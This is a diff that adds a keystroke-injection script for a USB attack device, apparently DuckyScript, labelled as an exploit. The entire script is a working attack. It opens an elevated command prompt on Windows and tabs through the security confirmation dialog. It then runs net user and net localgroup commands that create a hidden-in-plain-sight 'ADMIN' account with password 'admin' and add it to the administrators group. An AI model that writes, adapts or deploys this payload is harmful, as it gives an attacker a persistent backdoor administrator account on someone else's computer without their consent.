@@ -1,0 +1,41 @@
+**REM Author: SULAMAN SAEED**
+**REM Description: Exploit to create a new local administrator account “Admin” with the password “admin”.**
+**REM The new account will be called "Admin".**
+<p>
+REM Star delay
+DELAY 1000
+DELAY 300
+REM  Open start menu
+GUI
+DELAY 600
+STRING cmd
+DELAY 300
+REM Open Sub menu to run as admin
+SHIFT F10
+DELAY 300
+DOWN
+DELAY 300
+ENTER
+REM Tab tab to by pass security dialog
+DELAY 600;
+TAB
+DELAY 600
+TAB
+DELAY 300
+ENTER
+REM Run command to create user
+DELAY 500
+STRING net user /add ADMIN admin
+DELAY 300
+ENTER
+REM Run command to add the user in admin group
+DELAY 300
+STRING net localgroup administrators ADMIN /add
+DELAY 300
+ENTER
+REM Exit the command prompt
+DELAY 300
+STRING exit
+DELAY 300
+ENTER
+</p>
